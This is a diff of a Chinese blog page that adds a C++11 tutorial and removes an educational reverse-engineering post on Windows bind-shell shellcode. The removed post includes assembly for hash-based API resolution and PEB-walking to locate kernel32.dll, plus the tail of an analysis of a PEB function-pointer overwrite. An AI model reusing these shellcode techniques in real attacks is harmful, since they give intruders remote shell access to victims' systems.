+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">Point</span>()=<span class="keyword">default</span>;<span class="comment">//解决方法</span></span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Point A;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个构造函数不允许有函数体,其作用就相当于缺省构造函数</p>
+<h2 id="delete关键字"><a href="#delete关键字" class="headerlink" title="delete关键字"></a>delete关键字</h2><p>之前在一个C++类中,即使啥函数没写,编译器也会自动生成至少俩函数</p>
+<p><code>operator=</code>和<code>copy ctor</code></p>
+<p>然而我就不想让他生成这俩函数,禁止对象拷贝</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">in <span class="keyword">class</span> <span class="title class_">LinkedNode</span>:</span><br><span class="line">LinkedNode <span class="keyword">operator</span>=(<span class="type">const</span> LinkedNode &amp;)=<span class="keyword">delete</span>;</span><br><span class="line"><span class="built_in">LinkedNode</span>(<span class="type">const</span> LinkedNode&amp;)=<span class="keyword">delete</span>;</span><br></pre></td></tr></table></figure>
+
+<p>此时主函数中想用一个节点拷贝另一个节点,编译报错</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221221205948052.png" alt="image-20221221205948052"></p>
+<p>实际应用比如在basic_ostream中,delete用来禁用对char8_t*类型的流输出运算</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cpp_char8_t <span class="comment">// These deleted overloads are specified in P1423.</span></span></span><br><span class="line"><span class="comment">// don&#x27;t insert a UTF-8 NTBS</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">_Traits</span>&gt;</span><br><span class="line">basic_ostream&lt;<span class="type">char</span>, _Traits&gt;&amp; <span class="keyword">operator</span>&lt;&lt;(basic_ostream&lt;<span class="type">char</span>, _Traits&gt;&amp;, <span class="type">const</span> <span class="type">char8_t</span>*) = <span class="keyword">delete</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">_Traits</span>&gt;</span><br><span class="line">basic_ostream&lt;<span class="type">wchar_t</span>, _Traits&gt;&amp; <span class="keyword">operator</span>&lt;&lt;(basic_ostream&lt;<span class="type">wchar_t</span>, _Traits&gt;&amp;, <span class="type">const</span> <span class="type">char8_t</span>*) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="explicit关键字"><a href="#explicit关键字" class="headerlink" title="explicit关键字"></a>explicit关键字</h2><p>explicit修饰的构造函数,不允许参数隐式类型转换</p>
+<h2 id="constexpr关键字"><a href="#constexpr关键字" class="headerlink" title="constexpr关键字"></a>constexpr关键字</h2><p>const和constexpr的区别</p>
+<p>之前使用的const名为”常量”实际上是”常变量”</p>
+<p>const修饰的变量和未经其修饰的变量只有源代码层面的级别,想要修改const变量会被编译器安全检查阻止.然而一旦通过了编译,到了汇编层面,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a=10</span><br><span class="line">const int b=10</span><br></pre></td></tr></table></figure>
+
+<p>两者的底层存储没有任何区别</p>
+<p>反汇编根本看不出const属性,顶多可以发现对b只有read操作,没有任何write操作</p>
+<p>constexpr是真的常量</p>
+<p>在编译阶段,编译器把所有能够计算得出的constexpr替换成字面量,constexpr修饰的函数会用其返回值字面量替换函数调用</p>
+<p>实在计算不出来的,比如需要链接其他模块函数才能算出来的,编译器就会忽略constexpr修饰,视为普通变量或者函数</p>
+<h2 id="enum-class"><a href="#enum-class" class="headerlink" title="enum class"></a>enum class</h2><p>之前的c++中,枚举类型实际上就是给int类型起了个别名</p>
+<p>比如</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span>&#123;</span><br><span class="line">    WHITE,BLACK,RED</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span>&#123;</span><br><span class="line">    SOUTH,NORTH,EAST,WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;WHITE&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;SOUTH&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">if</span>(WHITE==SOUTH)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译链接时会警告不同类的枚举相比较</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp -O0 -o main</span><br><span class="line">main.cpp: In <span class="keyword">function</span> <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">main.cpp:14:15: warning: comparison between <span class="string">&#x27;enum Color&#x27;</span> and <span class="string">&#x27;enum Direction&#x27;</span> [-Wenum-compare]</span><br><span class="line">     <span class="keyword">if</span>(WHITE==SOUTH)&#123;</span><br><span class="line">               ^</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">0  0</span><br><span class="line"><span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是说不同的枚举没有严格的类型区别</p>
+<p>c++11就修正了这一点</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Color</span>&#123;</span><br><span class="line">    WHITE,BLACK,RED</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Direction</span>&#123;</span><br><span class="line">    SOUTH,NORTH,EAST,WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;Color::WHITE&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;Direction::SOUTH&lt;&lt;endl;<span class="comment">//不允许打印!&lt;&lt;没有重载Color::WHITE类型</span></span><br><span class="line">    <span class="keyword">if</span>(Color::WHITE==Direction::SOUTH)&#123;<span class="comment">//不允许比较!没有重载==运算符</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="非受限联合体"><a href="#非受限联合体" class="headerlink" title="非受限联合体"></a>非受限联合体</h2><p>感觉用处不是很大,了解一下POD类型吧</p>
+<h3 id="POD类型"><a href="#POD类型" class="headerlink" title="POD类型"></a>POD类型</h3><p>Plain Old Data,平凡的老的数据</p>
+<p>C的所有数据类型,包括基本数据类型和任何结构体,都是POD,</p>
+<p>可以这样理解POD:其内存布局是很规则的,两个同类的POD之间可以直接用memcpy拷贝数据.啥意思呢?</p>
+<p>比如</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	<span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">&#125;Point;</span><br><span class="line">Point A;</span><br><span class="line">Point B;</span><br><span class="line">A.__x=<span class="number">10</span>;</span><br><span class="line">A.__y=<span class="number">20</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(B,A,<span class="built_in">sizeof</span>(B));</span><br><span class="line"><span class="comment">//此后B.__x=10,B.__y=20</span></span><br></pre></td></tr></table></figure>
+
+<p>B和A是同类型的POD,那么A直接拷贝给B,A的第一个字节给B的第一个字节,A的第二个字节给B的第二个字节…显然组装起来的B,其前四个字节就是<code>__x</code>,后四个字节就是__y&#96;,毋庸置疑的</p>
+<p>c++11中可以使用<code>std::is_trivial&lt;T&gt;::value</code>来检查一个类型是否是POD</p>
+<p>比如</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">STRUCTPOINT</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">STRUCTPOINT</span>()=<span class="keyword">default</span>;<span class="comment">//有缺省构造函数仍然是POD</span></span><br><span class="line">&#125;Point;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MyPoint</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">MyPoint</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;&#125;<span class="comment">//有非缺省构造函数,不是POD</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;is_trivial&lt;Point&gt;::value&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;is_trivial&lt;MyPoint&gt;::value&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\cpp&gt; g++ -std=c+<span class="number">+11</span> main.cpp -O0 -o main</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\cpp&gt; ./main</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>如果一个类有非缺省构造函数,或者有虚函数,虚基类,或者成员变量有不同的访问修饰或者第一个成员不是自己的,或者有父类并且父类本类都有成员变量,他就是非POD</p>
+<p>这一点好理解</p>
+<p>有虚函数的类,其基地址开始的4个字节是虚表指针,不是其成员,使用memcpy也会拷贝虚表指针</p>
+<h2 id="assertion"><a href="#assertion" class="headerlink" title="assertion"></a>assertion</h2><p>编译阶段的断言</p>
+<p><code>static_assert(bool,string_literal)</code>如果前面的bool表达式为真,则通过编译</p>
+<p>否则报告后面的字符串字面量,然后终止编译</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">static_assert</span>(<span class="literal">true</span>,<span class="string">&quot;字符串字面量&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样可以通过编译,啥也不会发生</p>
+<p>如果这样写就不让通过:</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221221214450658.png" alt="image-20221221214450658"></p>
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/19/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2615,546 +3121,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00424B08   mov         eax,7FFDF020h	;程序PEB中线程同步函数的地址 RtlEnterCriticalSection函数指针的位置.放到eax中</span><br><span class="line">00424B0D   mov         ebx,77F82060h	;NTDLL.DLL库中RtlEnterCriticalSection的地址,放到ebx中</span><br><span class="line">00424B12   mov         dword ptr [eax],ebx;将ebx值赋值到eax指向的内存地址,也就是把NTDLL.DLL中,RtlEnterCriticalSection函数地址放到了PEB中的函数指针上</span><br></pre></td></tr></table></figure>
 
 <h5 id="三层循环解析函数地址-弹窗"><a href="#三层循环解析函数地址-弹窗" class="headerlink" title="三层循环解析函数地址,弹窗"></a>三层循环解析函数地址,弹窗</h5><p>剩下的shellcode之前已经分析过了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/18/Bind-shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
-      <meta itemprop="name" content="dustball">
-      <meta itemprop="description" content="dustland">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dustland">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/18/Bind-shell/" class="post-title-link" itemprop="url">bindshell逆向分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-09-18 20:33:00 / Modified: 20:34:13" itemprop="dateCreated datePublished" datetime="2022-09-18T20:33:00+08:00">2022-09-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind_shell"></a>Bind_shell</h1><h2 id="哈希算法设计"><a href="#哈希算法设计" class="headerlink" title="哈希算法设计"></a>哈希算法设计</h2><p>1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标函数.原则上不设计处理碰撞的算法</p>
-<p>2.函数名的摘要值尽可能短</p>
-<p>3.哈希算法自己的篇幅尽量短</p>
-<p>4.哈希后的摘要值可以当作”准nop指令”,即在数值上相当于某些机器码,但是这些机器码的执行不会对shellcode产生影响.如此可以省去跳转指令</p>
-<p>书上采取的哈希算法是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>
-
-<p>dl初始值为0,</p>
-<p>将库函数名逐个字节与0x71异或然后用dl减去该值累计哈希值,</p>
-<p>最终的哈希值放在dl中,只需要1个字节</p>
-<p>用这个哈希算法得到的各个函数的哈希值:</p>
-<table>
-<thead>
-<tr>
-<th>函数名</th>
-<th>哈希值</th>
-<th>准nop指令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>LoadLibraryA</td>
-<td>0x59</td>
-<td>pop ecx</td>
-</tr>
-<tr>
-<td>CreateProcessA</td>
-<td>0x91</td>
-<td></td>
-</tr>
-<tr>
-<td>ExitProcess</td>
-<td>0xc9</td>
-<td></td>
-</tr>
-<tr>
-<td>WSAStartup</td>
-<td>0xd3</td>
-<td>or ecx,0x203062d3</td>
-</tr>
-<tr>
-<td>WSASocketA</td>
-<td>0x62</td>
-<td></td>
-</tr>
-<tr>
-<td>bind</td>
-<td>0x30</td>
-<td></td>
-</tr>
-<tr>
-<td>listen</td>
-<td>0x20</td>
-<td></td>
-</tr>
-<tr>
-<td>accept</td>
-<td>0x41</td>
-<td>ecx</td>
-</tr>
-</tbody></table>
-<p>然后紧跟着cmd也写上</p>
-<table>
-<thead>
-<tr>
-<th>Ascii字符</th>
-<th>Ascii值</th>
-<th>准nop指令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>C</td>
-<td>0x43</td>
-<td>inc ebx</td>
-</tr>
-<tr>
-<td>M</td>
-<td>0x4d</td>
-<td>dec dbp</td>
-</tr>
-<tr>
-<td>d</td>
-<td>0x64</td>
-<td>FS:</td>
-</tr>
-</tbody></table>
-<p>准nop指令全都是不疼不痒的指令</p>
-<p>因此bind-shell一开始是这样写的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; start of shellcode </span><br><span class="line">; assume: eax points here </span><br><span class="line">; function hashes (executable as nop-equivalent) </span><br><span class="line">	_emit 0x59	; LoadLibraryA ; pop ecx </span><br><span class="line">	_emit 0x81 	; CreateProcessA ; or ecx, 0x203062d3 </span><br><span class="line">	_emit 0xc9 	; ExitProcess </span><br><span class="line">	_emit 0xd3 	; WSAStartup </span><br><span class="line">	_emit 0x62 	; WSASocketA </span><br><span class="line">	_emit 0x30 	; bind </span><br><span class="line">	_emit 0x20 	; listen </span><br><span class="line">	_emit 0x41 	; accept ; inc ecx </span><br><span class="line"></span><br><span class="line">; &quot;CMd&quot; </span><br><span class="line">	_emit 0x43 	; inc ebx </span><br><span class="line">	_emit 0x4d 	; dec ebp </span><br><span class="line">	_emit 0x64 	; FS: </span><br></pre></td></tr></table></figure>
-
-
-
-<p>_emit相当于db,作用是定义字节数据</p>
-<p>这些数据会被当做指令执行下来,但是影响不大</p>
-<p>用ida反汇编观察这片区域</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">59                            pop     ecx</span><br><span class="line">81 C9 D3 62 30 20             or      ecx, 203062D3h</span><br><span class="line">41                            inc     ecx</span><br><span class="line">43                            inc     ebx</span><br><span class="line">4D                            dec     ebp</span><br><span class="line">                              db      64h</span><br></pre></td></tr></table></figure>
-
-<p>只要是不影响程序计数器eip的指令,比如跳转和调用,都可以作为准nop指令</p>
-<p>后面的指令从windows11上调试会发生错误,需要在windowsXP上调</p>
-<h2 id="解析符号"><a href="#解析符号" class="headerlink" title="解析符号"></a>解析符号</h2><p>用三层循环解析符号,最外圈遍历我们要找的符号,中圈遍历库函数,内圈计算一个库函数的哈希值然后和我们的哈希值进行比较</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918111811581.png" alt="image-20220918111811581"></p>
-<p>用伪代码表示为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(遍历我们给出的符号哈希表)&#123;</span><br><span class="line">	<span class="keyword">while</span>(遍历库函数名表)&#123;</span><br><span class="line">		<span class="keyword">while</span>(计算一个库函数的哈希值);</span><br><span class="line">		<span class="keyword">if</span>(库函数哈希值=我们给出的哈希值)&#123;</span><br><span class="line">			<span class="comment">//找到了该符号;</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">//没有找到该符号,尝试下一个用库函数来解析本符号;</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(我们的哈希表解析到头)&#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-<h3 id="外圈循环初始化"><a href="#外圈循环初始化" class="headerlink" title="外圈循环初始化"></a>外圈循环初始化</h3><p>使用装载器执行bindshell时,bindshell之前的指令是</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax,bindshell</span><br><span class="line">push eax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>eax的初始值为bindshell的基地址,bindshell在栈中,因此eax的初始值是一个栈中地址,这对于理解后面的cdq指令是有作用的</p>
-<h4 id="设置函数地址存放空间"><a href="#设置函数地址存放空间" class="headerlink" title="设置函数地址存放空间"></a>设置函数地址存放空间</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; start of proper code </span><br><span class="line">	cdq 					; set edx = 0 (eax points to stack so is less than 0x80000000) </span><br><span class="line">	xchg eax, esi 			; esi = addr of first function hash </span><br><span class="line">	lea edi, [esi - 0x18] 	; edi = addr to start writing function </span><br><span class="line">							; addresses (last addr will be written just </span><br><span class="line">							; before &quot;cmd&quot;) </span><br></pre></td></tr></table></figure>
-
-<p>cdq指令的作用是eax带符号拓展到edx:eax,又bindshell一开始时,eax寄存器中是一个用户栈地址,显然这个值是一个小于0x80000000的数,那么eax的最高位必然是0,带符号拓展到edx全是0,这就用最短的指令使得edx置零了</p>
-<p>xchg将eax和esi寄存器中的值进行交换,交换前esi&#x3D;0,eax&#x3D;address(shellcode)</p>
-<p>交换后eax&#x3D;0,esi&#x3D;address(shellcode),又shellcode最开始就是<code>_emit 0x59	; LoadLibraryA ; pop ecx </code>即LoadLibraryA函数的摘要值,因此相当于设置好了源操作数</p>
-<p>然后esi-0x18这个地址放到edi上,距离esi共24字节,放到执行方向的反方向,意思是不要干扰shellcode的执行</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png"></p>
-<p><strong>奇怪的是,我们需要解析8个符号,为什么只给了24字节6个符号的地址空间呢?</strong></p>
-<p><strong>这是因为后两个符号将会覆盖一开始给他设定的摘要的位置</strong></p>
-<h4 id="获取kernel32-dll基地址"><a href="#获取kernel32-dll基地址" class="headerlink" title="获取kernel32.dll基地址"></a>获取kernel32.dll基地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">; find base addr of kernel32.dll </span><br><span class="line">	mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">	mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">	mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">	mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br></pre></td></tr></table></figure>
-
-<p>然后开始定位kernel32.dll的基地址</p>
-<img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" alt="md,绝了" style="zoom: 33%;" />
-
-<p>fs段选择子指向GDT中当前程序的线程环境块描述符,</p>
-<p>用fs段超越寻址,fs:[edx+0x30],此时edx&#x3D;0,实际上相当于fs:[0x30],也就是TEB表的0x30位置,即PEB的指针.</p>
-<table>
-<thead>
-<tr>
-<th>寄存器</th>
-<th>值意义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ebx</td>
-<td>PEB基地址</td>
-</tr>
-<tr>
-<td>ecx</td>
-<td>initialisation order表第二项,kernel32.dll相关项</td>
-</tr>
-<tr>
-<td>ebp</td>
-<td>kernel32.dll的基地址</td>
-</tr>
-</tbody></table>
-<h4 id="抬栈申请空间"><a href="#抬栈申请空间" class="headerlink" title="抬栈申请空间"></a>抬栈申请空间</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; make some stack space </span><br><span class="line">	mov dh, 0x03 			; sizeof(WSADATA) is 0x190 </span><br><span class="line">	sub esp, edx </span><br></pre></td></tr></table></figure>
-
-<p>edx始终是0,dh&#x3D;0x03则edx&#x3D;0x300</p>
-<p>然后抬栈0x300字节</p>
